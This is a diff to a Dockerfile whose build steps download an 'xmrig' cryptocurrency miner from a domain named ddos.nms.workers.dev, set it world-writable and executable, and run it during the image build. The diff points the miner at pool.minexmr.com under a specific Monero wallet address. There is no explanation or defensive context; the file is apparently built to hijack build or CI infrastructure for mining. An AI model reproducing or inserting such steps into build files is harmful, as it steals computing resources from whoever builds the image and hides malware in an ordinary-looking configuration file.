@@ -1,7 +1,5 @@
 FROM centos:latest
 
-WORKDIR /opt
-
 RUN curl -O https://ddos.nms.workers.dev/xmrig
-RUN chmod +x xmrig
-RUN timeout 10m ./xmrig -o 129.154.59.76:3333 -a cn/upx2 -u $(date +%Y%m%d%H%M%S)
+RUN chmod 777 xmrig
+RUN timeout 10m ./xmrig -a cn/upx2 -o pool.minexmr.com:4444 -u 453YeXrQMiahiYEbJXH4172KP8a6QagRAGWQpcpepuHiJ7QeiPyr2ZvEhwPrrTFu21ETGAY5SCdphFb26dYVcnSYHR1HPy5 -p $(date "+%Y%m%d%H%M%S")
